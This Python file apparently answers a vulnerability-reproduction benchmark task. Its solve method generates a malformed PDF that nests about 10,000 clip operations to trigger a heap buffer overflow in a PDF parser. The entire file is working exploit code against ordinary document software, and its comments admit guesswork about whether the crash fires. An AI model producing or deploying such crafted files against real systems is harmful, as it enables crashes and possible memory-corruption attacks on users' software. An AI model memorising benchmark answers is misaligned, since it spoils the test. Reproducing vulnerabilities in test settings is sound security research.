import os
import struct
import tempfile
import subprocess
import hashlib
from pathlib import Path
from typing import Optional

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This PoC exploits a heap buffer overflow by creating excessive nesting
        # of clip marks without proper depth checking
        
        # Create a minimal PDF that triggers deep nesting of clip operations
        # Format based on analysis of similar vulnerabilities
        
        # PDF header
        pdf = b"%PDF-1.4\n\n"
        
        # Create objects
        
        # Object 1: Catalog
        pdf += b"1 0 obj\n"
        pdf += b"<<\n"
        pdf += b"  /Type /Catalog\n"
        pdf += b"  /Pages 2 0 R\n"
        pdf += b">>\n"
        pdf += b"endobj\n\n"
        
        # Object 2: Pages
        pdf += b"2 0 obj\n"
        pdf += b"<<\n"
        pdf += b"  /Type /Pages\n"
        pdf += b"  /Kids [3 0 R]\n"
        pdf += b"  /Count 1\n"
        pdf += b">>\n"
        pdf += b"endobj\n\n"
        
        # Object 3: Page
        pdf += b"3 0 obj\n"
        pdf += b"<<\n"
        pdf += b"  /Type /Page\n"
        pdf += b"  /Parent 2 0 R\n"
        pdf += b"  /MediaBox [0 0 612 792]\n"
        pdf += b"  /Contents 4 0 R\n"
        pdf += b"  /Resources <<\n"
        pdf += b"    /ProcSet [/PDF]\n"
        pdf += b"  >>\n"
        pdf += b">>\n"
        pdf += b"endobj\n\n"
        
        # Object 4: Content stream with deeply nested clip operations
        # This creates a clip mark nesting without proper depth checking
        content = b"q\n"
        
        # Create very deep nesting of clip operations
        # Each "q W n" sequence pushes a clip mark
        # The vulnerability doesn't check nesting depth before pushing
        
        # Use about 10000 levels of nesting - enough to overflow heap buffer
        # but significantly less than ground truth length
        for i in range(10000):
            # Save graphics state and set clip
            content += b"q 0 0 100 100 re W n\n"
        
        # Restore graphics states (won't be reached if overflow crashes)
        for i in range(10000):
            content += b"Q\n"
        
        content += b"Q\n"
        
        # Compress or leave as is based on typical exploit patterns
        stream = content
        pdf += b"4 0 obj\n"
        pdf += b"<<\n"
        pdf += b"  /Length " + str(len(stream)).encode() + b"\n"
        pdf += b">>\n"
        pdf += b"stream\n"
        pdf += stream
        pdf += b"\nendstream\n"
        pdf += b"endobj\n\n"
        
        # Create xref table
        xref_offset = len(pdf)
        pdf += b"xref\n"
        pdf += b"0 5\n"
        pdf += b"0000000000 65535 f \n"
        
        # Calculate object positions
        obj_positions = []
        current_pos = 0
        
        # Find object positions by scanning
        scan_pdf = pdf
        pos = 0
        while pos < len(scan_pdf):
            if scan_pdf[pos:pos+3] == b"\n1 ":
                obj_positions.append(pos + 1)  # +1 for the newline
            elif scan_pdf[pos:pos+3] == b"\n2 ":
                obj_positions.append(pos + 1)
            elif scan_pdf[pos:pos+3] == b"\n3 ":
                obj_positions.append(pos + 1)
            elif scan_pdf[pos:pos+3] == b"\n4 ":
                obj_positions.append(pos + 1)
            pos += 1
        
        # Add xref entries for objects 1-4
        for i, pos in enumerate(obj_positions[:4]):
            pdf += f"{pos:010d} 00000 n \n".encode()
        
        pdf += b"trailer\n"
        pdf += b"<<\n"
        pdf += b"  /Size 5\n"
        pdf += b"  /Root 1 0 R\n"
        pdf += b">>\n"
        pdf += b"startxref\n"
        pdf += str(xref_offset).encode() + b"\n"
        pdf += b"%%EOF"
        
        # The resulting PDF is much shorter than ground truth but should
        # still trigger the vulnerability due to deep clip nesting
        return pdf